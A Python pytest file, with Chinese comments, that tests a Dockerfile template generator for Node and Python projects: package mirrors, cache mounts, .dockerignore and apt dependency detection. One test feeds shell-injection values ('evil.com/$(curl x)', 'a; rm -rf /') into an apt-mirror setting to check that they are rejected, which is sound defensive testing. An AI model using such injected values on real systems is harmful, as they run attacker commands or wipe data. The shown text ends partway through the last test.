"""Dockerfile 模板测试（WBS-12）。"""

from __future__ import annotations

import json
import shutil
import time
from pathlib import Path

import pytest

from local_webpage_access.dockerfile_templates import generate_dockerfile
from tests.scripts._helpers import make_container_manifest
from local_webpage_access.models import (
    ContainerConfig,
    DatabaseConfig,
    EntryConfig,
    InstanceManifest,
    Kind,
    ResourceProfile,
    Runtime,
    ServingMode,
)
from local_webpage_access.paths import Workspace


def _mk_manifest(
    *,
    mid: str = "api",
    kind: Kind = Kind.PYTHON,
    stack: list[str] | None = None,
    install: str | None = None,
    build: str | None = None,
    start: str | None = None,
    internal_port: int = 8000,
    has_database: bool = False,
    database_type: str | None = None,
    build_hooks: list[str] | None = None,
    pre_start: str | None = None,
    system_deps: list[str] | None = None,
) -> InstanceManifest:
    kwargs: dict = dict(
        id=mid,
        name=mid,
        version="1",
        kind=kind,
        stack=stack or [],
        runtime=Runtime.DOCKER_COMPOSE,
        servingMode=ServingMode.CONTAINER,
        resourceProfile=ResourceProfile.SMALL,
        container=ContainerConfig(
            projectName=f"lwa-{mid}",
            internalPort=internal_port,
            composePath="docker/compose.yaml",
            dockerfilePath="docker/Dockerfile",
        ),
        entry=EntryConfig(install=install, build=build, start=start),
        hasDatabase=has_database,
        database=DatabaseConfig(type=database_type) if has_database and database_type else None,
        buildHooks=build_hooks or [],
        preStart=pre_start,
        systemDeps=system_deps or [],
    )
    return InstanceManifest(**kwargs)


# ---- Node -------------------------------------------------------------------


def test_node_dockerfile_uses_alpine_and_npm_ci(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.NODE,
        stack=["express"],
        install="npm ci",
        start="npm run start",
        internal_port=3000,
    )
    path = generate_dockerfile(m, workspace)
    assert path == workspace.app_dockerfile_path("api")
    content = path.read_text(encoding="utf-8")
    assert "FROM node:24-alpine" in content
    assert "COPY current/package*.json ./" in content
    assert "RUN npm ci" in content
    assert "COPY current/ ./" in content
    assert "ENV PORT=3000" in content
    assert "EXPOSE 3000" in content
    assert 'CMD ["npm", "run", "start"]' in content


def test_node_dockerfile_includes_build_step_when_present(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.NODE,
        stack=["next"],
        install="npm ci",
        build="npm run build",
        start="npm run start",
        internal_port=3000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN npm run build" in content


def test_node_dockerfile_supports_pnpm_lockfile(workspace: Workspace) -> None:
    """BUG-041：pnpm 项目应复制 pnpm-lock.yaml 并运行 pnpm install。"""
    m = _mk_manifest(
        kind=Kind.NODE,
        stack=["express"],
        install="corepack enable && pnpm install --frozen-lockfile",
        start="npm run start",
        internal_port=3000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/package.json current/pnpm-lock.yaml ./" in content
    assert "pnpm install" in content
    assert "--frozen-lockfile" in content
    assert "COPY current/package*.json ./" not in content


def test_yarn_git_dependency_installs_git(workspace: Workspace) -> None:
    """BUG-948：yarn.lock 含 git 依赖时，alpine 镜像要先有 git。"""
    current = workspace.app_current("api")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        '{"dependencies":{"codemirror":"git+https://github.com/hackmdio/codemirror.git"}}\n',
        encoding="utf-8",
    )
    (current / "yarn.lock").write_text(
        '"codemirror@https://github.com/hackmdio/codemirror.git#npm":\n'
        '  resolved "https://github.com/hackmdio/codemirror.git#abc"\n',
        encoding="utf-8",
    )
    m = _mk_manifest(
        kind=Kind.NODE,
        install="corepack enable && yarn install --frozen-lockfile",
        start="node server.js",
        internal_port=3000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "apk add --no-cache git" in content
    body = content.split("WORKDIR /app", 1)[1]
    assert body.index("apk add") < body.index("yarn install")


def test_node_dockerfile_supports_yarn_lockfile(workspace: Workspace) -> None:
    """BUG-041：yarn 项目应复制 yarn.lock 并运行 yarn install。"""
    m = _mk_manifest(
        kind=Kind.NODE,
        stack=["express"],
        install="corepack enable && yarn install --frozen-lockfile",
        start="npm run start",
        internal_port=3000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/package.json current/yarn.lock ./" in content
    assert "yarn install" in content
    assert "--frozen-lockfile" in content
    assert "COPY current/package*.json ./" not in content


def test_node_dockerfile_default_start_when_missing(workspace: Workspace) -> None:
    m = _mk_manifest(kind=Kind.NODE, install="npm install", start=None)
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert 'CMD ["node", "server.js"]' in content


# ---- Python: FastAPI / Flask / Django / Streamlit / Gradio -------------------


def test_python_fastapi_dockerfile(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install -r requirements.txt",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
        internal_port=8000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "FROM python:3.13-slim" in content
    assert "COPY current/requirements.txt requirements.txt" in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content
    assert "pip install -r requirements.txt" in content
    assert "ENV PORT=8000" in content
    assert '["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]' in content


def test_python_zero_dependency_skips_pip_layer(workspace: Workspace) -> None:
    """CHK-225：install=None（stdlib 零依赖）不得兜底 requirements.txt。

    旧实现用 "pip install -r requirements.txt" 兜底会 COPY 不存在的文件，
    docker build 必失败，而 CHK-V01 恰好豁免 install=None，端到端无拦截。
    """
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["stdlib-http"],
        install=None,
        start="python server.py",
        internal_port=8000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "pip install" not in content
    assert "requirements.txt" not in content
    assert "uv sync" not in content
    assert 'CMD ["python", "server.py"]' in content


def test_python_empty_uv_lock_fallback_renders_pip_path(workspace: Workspace) -> None:
    """issue #13 端到端：空壳 uv.lock 回退后，Dockerfile 走 requirements 分支。

    scanner 把 install 决策为 "pip install -r requirements.txt" 后，模板必须：
    COPY requirements.txt（不 COPY uv.lock）、不出现 uv sync、启动命令不带
    uv run 前缀——否则空壳 lock 的失败只是被推迟到构建期。
    """
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install -r requirements.txt",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
        internal_port=8000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/requirements.txt requirements.txt" in content
    assert "uv.lock" not in content
    assert "uv sync" not in content
    assert "uv run" not in content
    assert '["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]' in content


def test_python_flask_dockerfile(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["flask"],
        install="pip install -r requirements.txt",
        start="flask --app app run --host 0.0.0.0 --port 5000",
        internal_port=5000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "EXPOSE 5000" in content
    assert '["flask", "--app", "app", "run", "--host", "0.0.0.0", "--port", "5000"]' in content


def test_python_django_dockerfile(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["django"],
        install="pip install -r requirements.txt",
        start="python manage.py runserver 0.0.0.0:8000",
        internal_port=8000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert '["python", "manage.py", "runserver", "0.0.0.0:8000"]' in content


def test_python_streamlit_dockerfile(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["streamlit"],
        install="pip install -r requirements.txt",
        start="streamlit run app.py --server.port 8501",
        internal_port=8501,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "EXPOSE 8501" in content
    assert '["streamlit", "run", "app.py", "--server.port", "8501"]' in content


def test_python_pyproject_install_path(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install .",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # pyproject 路径：先拷整个项目再装
    assert "COPY current/ ./" in content
    assert "pip install ." in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content


def test_python_uv_sync_path(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="uv sync",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # BUG-185：依赖层只 COPY lock+pyproject，uv sync 须 --no-install-project，
    # 否则带 [build-system] 的 packaged 项目构建本体时缺源码必然失败。
    assert "uv sync --frozen --no-dev --no-install-project" in content
    assert "pip install uv" in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content
    assert "--mount=type=cache,target=/root/.cache/uv" in content
    # 启动命令自动包 uv run --no-sync --no-dev（BUG-865：运行期不再同步 dev 依赖）
    assert '"uv", "run", "--no-sync", "--no-dev", "uvicorn"' in content


def test_python_uv_sync_installs_project_after_full_copy(workspace: Workspace) -> None:
    """BUG-900：--no-sync 禁止运行期同步后，项目本体必须在构建期装进 venv——
    完整源码 COPY 之后再执行一次不带 --no-install-project 的 uv sync，
    否则 src/ 包布局项目启动即 ModuleNotFoundError、控制台入口也不生成。"""
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="uv sync",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # 依赖层（--no-install-project）→ 完整源码 → 项目本体安装层（无该旗标）
    deps_idx = content.index("uv sync --frozen --no-dev --no-install-project")
    copy_idx = content.index("COPY current/ ./", deps_idx)
    project_idx = content.index("uv sync --frozen --no-dev", copy_idx)
    assert "--no-install-project" not in content[project_idx:].splitlines()[0]
    assert deps_idx < copy_idx < project_idx


def test_python_uv_sync_user_start_not_double_prefixed(workspace: Workspace) -> None:
    """BUG-865：用户已写 uv run 的 start 不再叠加前缀；gunicorn 预检须剥掉标志位。"""
    from local_webpage_access.dockerfile_templates import _gunicorn_launch_command

    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="uv sync",
        start="uv run --no-sync --no-dev sh -c 'exec gunicorn -b 0.0.0.0:8000 main:app'",
        internal_port=8000,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert content.count('"uv", "run"') == 1
    # _strip_uv_run 须剥掉平台注入的标志，gunicorn 探测看到真实内层命令
    assert (
        _gunicorn_launch_command(m.entry.start, uses_uv=True)
        == "exec gunicorn -b 0.0.0.0:8000 main:app"
    )


def test_python_pipfile_install_path(workspace: Workspace) -> None:
    """BUG-024：Pipfile-only 项目应复制 Pipfile 并走 pipenv 安装。"""
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install pipenv && pipenv install --system --skip-lock",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/Pipfile* ./" in content
    assert "pip install pipenv" in content
    assert "pipenv install --system --skip-lock" in content
    assert "COPY current/requirements.txt ./" not in content


def test_python_uv_sync_injects_uv_default_index(workspace: Workspace) -> None:
    """BUG-207：uv sync 项目须注入 UV_DEFAULT_INDEX，否则依赖解析仍走官方 PyPI。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="uv sync", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # uv 段带 UV_DEFAULT_INDEX=<pip 镜像>（uv 读该变量做依赖解析）
    assert "UV_DEFAULT_INDEX=https://mirrors.aliyun.com/pypi/simple uv sync" in content
    # 安装 uv 本体的 pip 段仍走 -i
    assert "pip install uv -i https://mirrors.aliyun.com/pypi/simple" in content
    # uv 缓存挂载保留
    assert "--mount=type=cache,target=/root/.cache/uv" in content


def test_python_pipenv_injects_pipenv_mirror(workspace: Workspace) -> None:
    """BUG-207：pipenv 项目须注入 PIPENV_PYPI_MIRROR，否则依赖解析仍走官方 PyPI。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pipenv install --system --skip-lock",
        start="uvicorn main:app",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "PIPENV_PYPI_MIRROR=https://mirrors.aliyun.com/pypi/simple pipenv install" in content
    # 安装 pipenv 本体的 pip 段仍走 -i
    assert "pip install pipenv -i https://mirrors.aliyun.com/pypi/simple" in content


# ---- SQLite 数据目录约定 -----------------------------------------------------


def test_sqlite_project_creates_data_dir(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install -r requirements.txt",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
        has_database=True,
        database_type="sqlite",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN mkdir -p /app/data" in content


def test_sqlite_runtime_paths_creates_runtime_data_dir(workspace: Workspace) -> None:
    """BUG-198：runtime_paths 布局 mkdir /app/runtime/data。"""
    workspace.ensure_app_dirs("api")
    rp = workspace.app_current("api") / "src" / "app"
    rp.mkdir(parents=True, exist_ok=True)
    (rp / "runtime_paths.py").write_text("x=1\n")
    m = _mk_manifest(
        kind=Kind.PYTHON,
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        has_database=True,
        database_type="sqlite",
    )
    m.database.dataDir = "runtime/data"
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN mkdir -p /app/runtime/data" in content
    assert "RUN mkdir -p /app/data\n" not in content
    assert "数据库：sqlite" in content


def test_non_sqlite_project_skips_data_dir(workspace: Workspace) -> None:
    m = _mk_manifest(
        kind=Kind.PYTHON,
        stack=["fastapi"],
        install="pip install -r requirements.txt",
        start="uvicorn main:app --host 0.0.0.0 --port 8000",
        has_database=False,
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "/app/data" not in content
    assert "数据库：无" in content


# ---- 输出路径与头部 ----------------------------------------------------------


def test_dockerfile_written_to_docker_dir(workspace: Workspace) -> None:
    m = _mk_manifest()
    path = generate_dockerfile(m, workspace)
    assert path.is_file()
    assert path.parent == workspace.app_docker("api")


def test_dockerfile_header_records_summary(workspace: Workspace) -> None:
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "由 lwa 自动生成" in content
    assert "内部端口：8000" in content
    assert "模板：dockerfile_templates.py" in content


# ---- IMP-016 / IMP-017：Python 全栈 Node + 生产依赖分离 --------------------


def test_dockerfile_python_with_node(workspace: Workspace) -> None:
    """IMP-016：Python 项目源码含 package.json → Dockerfile 追加 Node 官方二进制。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text(
        '{"name":"pi-agent","dependencies":{}}'
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # base 仍为 python
    assert "FROM python:3.13-slim" in content
    # 追加 Node 工具链（默认国内 nodejs-release 镜像，BUG-200）
    assert "mirrors.aliyun.com/nodejs-release" in content
    # BUG-114：与纯 Node 基线 node:24-alpine 同一 major（非 v22）
    assert "/v24." in content
    assert "node-v24." in content
    assert "v22.19.0" not in content
    assert "npm ci" in content
    assert "--omit=dev" in content


def test_dockerfile_python_with_node_official_when_mirrors_disabled(
    workspace: Workspace,
) -> None:
    """BUG-200：buildMirrors.enabled=false 时回退官方 nodejs.org。"""
    from local_webpage_access.config import BuildMirrors, Config

    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text(
        '{"name":"pi-agent","dependencies":{}}'
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    cfg = Config(buildMirrors=BuildMirrors(enabled=False, preset="none"))
    content = generate_dockerfile(m, workspace, config=cfg).read_text(encoding="utf-8")
    assert "nodejs.org/dist/v24." in content
    assert "mirrors.aliyun.com/nodejs-release" not in content
    assert "pip install -r requirements.txt" in content
    assert "-i https://mirrors.aliyun.com" not in content


def test_dockerfile_uses_china_mirrors_by_default(workspace: Workspace) -> None:
    """BUG-200 / BUG-201：默认注入 pip/npm 国内源，regenerate 仍带镜像。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text('{"name":"x"}')
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "-i https://mirrors.aliyun.com/pypi/simple" in content
    assert "registry.npmmirror.com" in content
    # 再生成一次仍含国内源（不依赖手改 Dockerfile）
    content2 = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "-i https://mirrors.aliyun.com/pypi/simple" in content2
    assert "registry.npmmirror.com" in content2


def test_dockerfile_python_src_main_sets_pythonpath(workspace: Workspace) -> None:
    """src/main.py 布局 → Dockerfile 注入 PYTHONPATH=src；CMD 剥离 VAR= 前缀。"""
    workspace.ensure_app_dirs("api")
    src = workspace.app_current("api") / "src"
    src.mkdir(parents=True, exist_ok=True)
    (src / "main.py").write_text("app = None\n")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="PYTHONPATH=src uvicorn main:app --host 0.0.0.0 --port 8000",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "ENV PYTHONPATH=src" in content
    assert 'CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]' in content
    assert '"PYTHONPATH=src"' not in content


def test_dockerfile_python_without_node_omits_node_toolchain(
    workspace: Workspace,
) -> None:
    """IMP-016：无 package.json 的纯 Python 项目不加 Node（回归边界）。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "nodejs.org/dist" not in content
    assert "npm ci" not in content


def test_dockerfile_strips_pytest(workspace: Workspace) -> None:
    """IMP-017：仅 requirements.txt（无 prod 清单）→ 构建期 sed 剔除 pytest*。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "sed -i -E" in content
    assert "pytest" in content
    # 仍从 requirements.txt 安装（剥离后）
    assert "pip install -r requirements.txt" in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content


def test_dockerfile_prefers_requirements_prod(workspace: Workspace) -> None:
    """IMP-017：requirements-prod.txt 路径 → 直接装 prod 清单，不剥离 pytest。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements-prod.txt").write_text("fastapi\n")
    m = _mk_manifest(install="pip install -r requirements-prod.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/requirements-prod.txt requirements-prod.txt" in content
    assert "pip install -r requirements-prod.txt" in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content
    # prod 清单无需剥离
    assert "sed -i" not in content


# ---- BUG-083：嵌套 requirements 路径 COPY/RUN 一致 ------------------------


def test_dockerfile_nested_requirements_path_consistent(workspace: Workspace) -> None:
    """BUG-083：pip install -r requirements/prod.txt → COPY 保留嵌套路径 + mkdir 父目录。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements/prod.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # COPY 目标保留嵌套路径（不再平铺到 ./），且预先 mkdir 父目录
    assert "RUN mkdir -p requirements" in content
    assert "COPY current/requirements/prod.txt requirements/prod.txt" in content
    # RUN 安装路径与 COPY 落点一致
    assert "pip install -r requirements/prod.txt" in content
    assert "--mount=type=cache,target=/root/.cache/pip" in content
    # 不应出现平铺到根的旧写法（BUG-083 根因）
    assert "COPY current/requirements/prod.txt ./" not in content


def test_dockerfile_flat_requirements_no_mkdir(workspace: Workspace) -> None:
    """BUG-083：扁平 requirements.txt → COPY 到同名文件，无需 mkdir 父目录。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/requirements.txt requirements.txt" in content
    # 扁平路径无父目录，不应插入 mkdir
    assert "mkdir -p requirements\n" not in content


# ---- BUG-117：Python 缓存分层 / pip cache mount / .dockerignore --------------


def test_python_node_toolchain_before_full_source_copy(workspace: Workspace) -> None:
    """BUG-117：Node 安装与 npm ci 必须在 COPY current/ ./ 之前，避免源码改动打掉缓存。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text('{"name":"app","dependencies":{}}')
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    idx_node = content.find("nodejs-release")
    if idx_node < 0:
        idx_node = content.find("nodejs.org/dist")
    idx_npm = content.find("npm ci")
    # 取「完整源码拷贝」层：排除 package*.json / requirements 的局部 COPY
    idx_full = content.find("COPY current/ ./")
    assert idx_node >= 0
    assert idx_npm >= 0
    assert idx_full >= 0
    assert idx_node < idx_full
    assert idx_npm < idx_full


def test_python_pip_uses_buildkit_cache_mount(workspace: Workspace) -> None:
    """BUG-117：pip install 使用 BuildKit cache mount，避免每次全量重下。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "--mount=type=cache,target=/root/.cache/pip" in content
    assert "pip install -r requirements.txt" in content
    # 有 cache mount 时不再使用 --no-cache-dir（否则挂载缓存无效）
    assert "pip install --no-cache-dir" not in content


def test_generate_dockerfile_writes_dockerignore(workspace: Workspace) -> None:
    """BUG-117：构建上下文 apps/<id>/ 写入 .dockerignore，排除噪声目录。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    generate_dockerfile(m, workspace)
    ignore = (workspace.app_dir("api") / ".dockerignore").read_text(encoding="utf-8")
    for pattern in ("**/node_modules", "**/.git", "**/__pycache__", "**/.env", "source/"):
        assert pattern in ignore


def test_node_production_env_only_after_install_and_build(
    workspace: Workspace,
) -> None:
    """BUG-122：开发依赖完成 install/build 后才切 NODE_ENV=production。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        kind=Kind.NODE,
        install="npm ci",
        build="npm run build",
        start="npm start",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")

    env_index = content.index("ENV NODE_ENV=production")
    assert env_index > content.index("RUN npm ci")
    assert env_index > content.index("RUN npm run build")
    assert "ENV NODE_ENV=production" not in content[: content.index("RUN npm ci")]


def test_dockerignore_dist_only_for_build_entry(workspace: Workspace) -> None:
    """BUG-128 / issue#6：仅有 build 命令时排除源码树根级 dist/build。

    issue#6：旧的 ``**/dist`` 全局排除会把嵌套运行时产物目录
    （current/backend/dist、current/skills/dist 等）一并排除，破坏镜像内
    构建产物；现收窄为根级 ``current/dist`` / ``current/build``。
    """
    workspace.ensure_app_dirs("with-build")
    with_build = _mk_manifest(
        mid="with-build",
        kind=Kind.NODE,
        install="npm ci",
        build="npm run build",
        start="npm start",
    )
    generate_dockerfile(with_build, workspace)
    ignore = (workspace.app_dir("with-build") / ".dockerignore").read_text()
    assert "current/dist" in ignore
    assert "current/build" in ignore
    # 嵌套 dist 不被排除
    assert "**/dist" not in ignore
    assert "**/build" not in ignore
    assert "current/backend/dist" not in ignore

    workspace.ensure_app_dirs("without-build")
    without_build = _mk_manifest(
        mid="without-build",
        kind=Kind.NODE,
        install="npm ci",
        start="npm start",
    )
    generate_dockerfile(without_build, workspace)
    ignore = (workspace.app_dir("without-build") / ".dockerignore").read_text()
    # BUG-128：无 build 步骤时完全不排除（保留预构建产物）
    assert "**/dist" not in ignore
    assert "current/dist" not in ignore
    assert "current/build" not in ignore


def test_pip_run_injects_mirror_for_semicolon_segments() -> None:
    """_pip_run 须同时处理 ``;`` 分隔段，不只 ``&&``。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(
        enabled=True,
        preset="china",
        pip="https://mirrors.aliyun.com/pypi/simple/",
    )
    out = _pip_run(
        "pip install pipenv ; pipenv install --system --skip-lock",
        mirrors=mirrors,
    )
    assert "pip install pipenv -i https://mirrors.aliyun.com/pypi/simple" in out
    assert "PIPENV_PYPI_MIRROR=https://mirrors.aliyun.com/pypi/simple" in out


def test_apt_mirror_rejects_shell_injection() -> None:
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _apt_mirror_prefix

    with pytest.raises(ValueError, match="非法 aptMirror"):
        _apt_mirror_prefix(BuildMirrors(enabled=True, aptMirror="evil.com/$(curl x)"))
    with pytest.raises(ValueError, match="非法 aptMirror"):
        _apt_mirror_prefix(BuildMirrors(enabled=True, aptMirror="a; rm -rf /"))
    ok = _apt_mirror_prefix(BuildMirrors(enabled=True, aptMirror="mirrors.aliyun.com"))
    assert "mirrors.aliyun.com" in ok


# ---- BUG-359 / BUG-360：_to_exec_form 回退 + pytest extras 剥离 --------------


def test_to_exec_form_unclosed_quote_falls_back_to_shell() -> None:
    """BUG-359：未闭合引号不得抛 ValueError，应回退 shell 形式。"""
    import json

    from local_webpage_access.dockerfile_templates import _to_exec_form

    raw = 'uvicorn main:app --host "0.0.0.0'
    assert _to_exec_form(raw) == json.dumps(raw)


def test_to_exec_form_normal_command_stays_exec() -> None:
    """正常可解析命令仍输出 exec 数组形式。"""
    from local_webpage_access.dockerfile_templates import _to_exec_form

    out = _to_exec_form("uvicorn main:app --host 0.0.0.0")
    assert out.startswith("[")
    assert '"uvicorn"' in out
    assert '"main:app"' in out


def test_dockerfile_strips_pytest_extras_and_leading_space(workspace: Workspace) -> None:
    """BUG-360：pytest[extras] / 前导空格行也须被 sed 剥离。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # 扩展正则须覆盖 extras 的 ``[`` 与前导空白
    assert r"/^\s*pytest([-_]|[<>=!~\[]|$)/d" in content


# ---- IMP-054：Python 包 -> apt 系统库自动探测 --------------------------------


def test_uwsgi_in_uv_lock_installs_compile_deps(workspace: Workspace) -> None:
    """BUG-947：uv.lock / pyproject 里的 uwsgi 要在 pip 之前装编译依赖。"""
    current = workspace.app_current("api")
    current.mkdir(parents=True, exist_ok=True)
    (current / "pyproject.toml").write_text(
        '[project]\nname = "linkding"\ndependencies = ["uwsgi>=2.0"]\n',
        encoding="utf-8",
    )
    (current / "uv.lock").write_text(
        '[[package]]\nname = "uwsgi"\nversion = "2.0.28"\n',
        encoding="utf-8",
    )
    m = _mk_manifest(
        install="pip install uv && uv sync --frozen --no-dev",
        start="uwsgi --http :9090",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    for pkg in ("gcc", "libc6-dev", "libpcre3-dev"):
        assert pkg in content
    body = content.split("WORKDIR /app", 1)[1]
    assert body.index("libpcre3-dev") < body.index("uv sync")
    assert "依赖编译失败" in content
    assert "这不是镜像源不可达" in content


def test_pip_compile_failure_hint_is_not_unconditional_mirror(workspace: Workspace) -> None:
    """BUG-947：编译失败不得一律打印镜像源不可达。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "uwsgi>=2.0\n", encoding="utf-8"
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uwsgi")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "Failed building wheel" in content
    assert "grep -E" in content


def test_pyzbar_in_requirements_triggers_apt_install(workspace: Workspace) -> None:
    """IMP-054：requirements.txt 含 pyzbar 时自动追加 apt-get install libzbar0。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "fastapi>=0.115.0\nuvicorn[standard]>=0.32.0\npyzbar>=0.1.9\n",
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "libzbar0" in content
    assert "--no-install-recommends" in content
    assert "--fix-missing" in content
    # apt 块在 WORKDIR 之后、pip install 之前（用 RUN 行定位，跳过注释头）
    idx_workdir = content.index("WORKDIR /app")
    idx_apt = content.index("libzbar0", idx_workdir)
    idx_copy = content.index("COPY current/", idx_apt)
    assert idx_workdir < idx_apt < idx_copy
    assert "Acquire::Retries" in content


def test_no_apt_deps_when_requirements_clean(workspace: Workspace) -> None:
    """IMP-054：无系统库依赖的 requirements 不生成 apt 块。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "fastapi>=0.115.0\nuvicorn[standard]>=0.32.0\n",
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "apt-get install" not in content


def test_multiple_apt_deps_dedup_and_merge(workspace: Workspace) -> None:
    """IMP-054：多个需要系统库的包合并去重 apt 包列表。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "opencv-python>=4.8.0\npyzbar>=0.1.9\n",
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
